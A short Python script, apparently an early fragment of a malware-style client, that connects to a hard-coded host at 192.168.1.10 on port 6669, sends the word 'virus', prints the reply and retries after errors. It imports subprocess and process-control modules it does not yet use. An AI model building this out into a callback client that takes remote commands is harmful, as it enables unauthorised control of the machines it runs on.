import socket
import time
import psutil
import subprocess
from subprocess import Popen, PIPE, run, check_output, call
import signal
import os

HOST = "192.168.1.10"
PORT = 6669

try:
    ownSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ownSocket.connect((HOST, PORT))
    ownSocket.send("virus".encode("utf-8"))
    print(ownSocket.recv(1024).decode())


except (ConnectionResetError, BrokenPipeError) as e:
    print("the following execption occured: ", e)
    print("sleep for 5 seconds")
    time.sleep(5)

  

